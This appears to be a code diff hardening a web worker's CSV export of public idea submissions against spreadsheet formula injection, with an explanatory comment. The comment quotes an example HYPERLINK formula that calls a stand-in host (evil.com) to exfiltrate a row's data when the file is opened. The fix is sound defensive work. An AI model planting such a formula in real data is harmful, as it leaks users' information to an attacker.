@@ -5448,7 +5448,20 @@ export default {
       try {
         const data = await callWorkflow(env, LIST_WORKFLOW_ID, { customerSlug });
         const ideas = data?.ideas || [];
-        const csvEscape = (v) => '"' + String(v ?? "").replace(/"/g, '""') + '"';
+        // Formula/CSV injection (CWE-1236): title, description, category, and
+        // tags are all free-text an anonymous public submitter controls. If a
+        // cell's content starts with =, +, -, or @ (or a tab/CR), Excel/
+        // Sheets/LibreOffice treat it as a formula when the admin opens this
+        // export - e.g. a title of =HYPERLINK("http://evil.com/?"&A2,"...")
+        // would exfiltrate that row's other data the moment the file is
+        // opened. Prefixing with a single quote is the standard mitigation
+        // (OWASP's CSV injection cheat sheet): spreadsheet apps treat a
+        // leading ' as "force this cell to plain text" and don't display it.
+        const csvEscape = (v) => {
+          let s = String(v ?? "");
+          if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
+          return '"' + s.replace(/"/g, '""') + '"';
+        };
         const header = ["id", "title", "description", "category", "status", "votes", "tags", "is_pinned", "submitter_email", "linear_issue_url", "created_at"];
         const rows = ideas.map((i) => header.map((k) => csvEscape(i[k])).join(","));
         const csv = [header.join(","), ...rows].join("\r\n");
